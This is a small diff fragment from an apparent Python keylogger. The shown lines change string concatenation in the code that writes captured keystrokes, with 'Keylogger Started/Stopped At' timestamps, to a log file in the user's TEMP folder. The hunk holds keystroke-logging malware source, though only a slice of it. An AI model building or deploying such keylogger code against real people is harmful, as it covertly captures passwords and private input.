@@ -98,9 +98,9 @@ def OnKeyboardEvent(event):
             TMP = os.environ["TEMP"]
             objLogFile = open(TMP + "/log.txt", 'w')
             if blnStop == "True":
-                objLogFile.write("\n\n""Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")+"\n\n")
+                objLogFile.write("\n\n"+"Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S")+"\n\n")
             else:
-                objLogFile.write("\n\n""Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+                objLogFile.write("\n\n"+"Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
             objLogFile.write(strLogs); objLogFile.close()
             # create log file
 
